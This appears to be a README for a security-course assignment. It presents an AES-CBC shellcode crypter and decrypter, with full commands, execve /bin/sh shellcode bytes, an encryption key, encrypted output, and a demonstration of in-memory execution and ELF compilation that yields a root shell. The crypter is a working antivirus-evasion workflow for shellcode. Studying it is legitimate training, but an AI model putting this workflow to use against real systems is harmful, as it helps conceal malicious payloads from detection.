# Assignment 7: Custom Crypter

Custom shellcode crypter which uses AES-CBC mode. Optionally, you can chain other schemes such as XOR encoding.

To generate an encrypted shellcode payload of your choice, supply it as an argument to the `payload` parameter of `custom_crypter.py`:

```bash
python3 custom_crypter.py -p "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

[*] Shellcode length: 21 bytes (+ 11 bytes padding)

[*] Key: fvt2tdG57y8Ru6Kj

[*] Plaintext Shellcode: "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

[+] Encrypted Shellcode: "\x37\x6a\x76\x30\x42\x34\x6a\x58\x48\x77\x56\x45\x44\x70\x44\x50\x45\x8e\xd2\x0d\x42\xba\xce\xca\x6a\x97\x74\x28\x43\xa2\x30\x71\x06\x34\x6e\xdf\x91\xec\xa5\x2b\x23\xa5\xaa\xcf\xe6\x63\xa7\x5f\x91\xde\x9a\xde\x2a\x28\x62\x53\x26\x2b\xd1\x59\xca\x58\xdf\x32\x75\xa6\x3f\xdb\x62\xe8\x04\x8e\x51\xee\xf4\xdd\xb5\x63\x1c\xff\x00\x28\xb9\xdd\x5b\xc7\x01\xf5\xf0\x4a\xb6\x6c\x9d\x64\xf3\x36\x12\x7e\xf4\xe4\x08\x51\x03\x6e\x52\x3f\xd0\x1c\x01\xf2\xd6\x72\x19\xc2\x98\x98\xd5\x6a\x6f\xfe\xf1\xf2\x4d\xd4\xda\xd8\xb4\xee\x91\x52\xf8\x09\xd4\xdb\x0c\xa2\x7c\xe8\x6e\x4b\x73\x14\x6d\xac"
```

Next, copy the encryption key and the encrypted shellcode buffer returned from `custom_crypter.py` and supply them as arguments to `custom_decrypter.py`. The `run` argument is set to execute the decrypted shellcode in memory:

```bash
python3 custom_decrypter.py -k fvt2tdG57y8Ru6Kj -p "\x37\x6a\x76\x30\x42\x34\x6a\x58\x48\x77\x56\x45\x44\x70\x44\x50\x45\x8e\xd2\x0d\x42\xba\xce\xca\x6a\x97\x74\x28\x43\xa2\x30\x71\x06\x34\x6e\xdf\x91\xec\xa5\x2b\x23\xa5\xaa\xcf\xe6\x63\xa7\x5f\x91\xde\x9a\xde\x2a\x28\x62\x53\x26\x2b\xd1\x59\xca\x58\xdf\x32\x75\xa6\x3f\xdb\x62\xe8\x04\x8e\x51\xee\xf4\xdd\xb5\x63\x1c\xff\x00\x28\xb9\xdd\x5b\xc7\x01\xf5\xf0\x4a\xb6\x6c\x9d\x64\xf3\x36\x12\x7e\xf4\xe4\x08\x51\x03\x6e\x52\x3f\xd0\x1c\x01\xf2\xd6\x72\x19\xc2\x98\x98\xd5\x6a\x6f\xfe\xf1\xf2\x4d\xd4\xda\xd8\xb4\xee\x91\x52\xf8\x09\xd4\xdb\x0c\xa2\x7c\xe8\x6e\x4b\x73\x14\x6d\xac" -a run

[+] Decrypted Shellcode: "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"


[*] Executing decrypted shellcode in memory...
# hostname
kali
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

Alternatively, the `compile` argument can be set to compile the shellcode into an ELF binary:

```bash
python3 custom_decrypter.py -k fvt2tdG57y8Ru6Kj -p "\x37\x6a\x76\x30\x42\x34\x6a\x58\x48\x77\x56\x45\x44\x70\x44\x50\x45\x8e\xd2\x0d\x42\xba\xce\xca\x6a\x97\x74\x28\x43\xa2\x30\x71\x06\x34\x6e\xdf\x91\xec\xa5\x2b\x23\xa5\xaa\xcf\xe6\x63\xa7\x5f\x91\xde\x9a\xde\x2a\x28\x62\x53\x26\x2b\xd1\x59\xca\x58\xdf\x32\x75\xa6\x3f\xdb\x62\xe8\x04\x8e\x51\xee\xf4\xdd\xb5\x63\x1c\xff\x00\x28\xb9\xdd\x5b\xc7\x01\xf5\xf0\x4a\xb6\x6c\x9d\x64\xf3\x36\x12\x7e\xf4\xe4\x08\x51\x03\x6e\x52\x3f\xd0\x1c\x01\xf2\xd6\x72\x19\xc2\x98\x98\xd5\x6a\x6f\xfe\xf1\xf2\x4d\xd4\xda\xd8\xb4\xee\x91\x52\xf8\x09\xd4\xdb\x0c\xa2\x7c\xe8\x6e\x4b\x73\x14\x6d\xac" -a compile

[+] Decrypted Shellcode: "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"


[*] Compiling shellcode runner...

[+] Shellcode compiled. Execute ./shellcode to run

[*] Performing cleanup!

[*] Exiting.

┌──(root㉿kali)-[/home/jack/SLAE32/Assignment 7: Custom Crypter]
└─# ./shellcode 
Shellcode Length:  32
# hostname
kali
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

---
